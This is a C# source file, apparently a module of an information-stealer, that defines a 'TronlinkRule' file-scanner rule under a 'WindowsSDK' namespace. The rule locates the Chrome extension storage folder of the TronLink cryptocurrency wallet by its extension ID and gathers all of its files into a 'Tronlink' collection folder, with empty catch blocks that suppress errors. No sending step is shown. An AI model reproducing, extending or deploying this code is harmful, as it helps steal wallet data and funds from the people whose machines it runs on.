using System;
using System.Collections.Generic;
using System.IO;
using WindowsSDK.Objects.Files;

namespace WindowsSDK.Data.Files.Rules
{
    public class TronlinkRule : FileScannerRule
    {
        public TronlinkRule()
        {
            base.Name = "Tronlink";
        }

        public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
        {
            return "Tronlink";
        }

        public override IEnumerable<FileScannerArg> GetScanArgs()
        {
            List<FileScannerArg> list = new List<FileScannerArg>();
            try
            {
                string directory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec";
                list.Add(new FileScannerArg
                {
                    Directory = directory,
                    Pattern = "*",
                    Recoursive = false
                });
            }
            catch
            {
            }
            return list;
        }
    }
}
